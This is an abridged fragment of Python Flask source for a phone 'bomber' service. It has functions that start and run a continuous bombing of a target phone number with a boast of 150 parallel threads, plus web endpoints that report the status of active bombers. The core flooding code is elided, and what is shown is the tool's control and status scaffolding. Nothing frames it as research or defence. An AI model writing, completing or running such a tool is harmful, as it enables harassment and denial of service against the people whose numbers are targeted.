...
def run_continuous_bomber(phone, bomber_id, duration=300):
    ...
    while time.time() < end_time:
        ...
        # 🔥 ULTRA FAST: 150 parallel threads
...
def start_brutal_bomb(phone):
    ...
    try:
        ...
        # Start bomber in background thread
        def bomber_thread():
...
def get_bomber_status(bomber_id):
    """Get bomber status"""
    if bomber_id in active_bombers:
        info = active_bombers[bomber_id]
        if info['completed'] and info['result']:
            return {'success': True, 'data': info['result'], 'completed': True}
        return {'success': True, 'data': {'status': 'running'}, 'completed': False}
    return {'success': False, 'message': 'Bomber not found'}
...
def bomb_status_api():
    ...
    result = get_bomber_status(bomber_id)
    return jsonify(result)

@app.route('/bomb/stats', methods=['GET'])
def bomb_stats_api():
    """Get all active bombers"""
    active = []
    for bid, info in active_bombers.items():
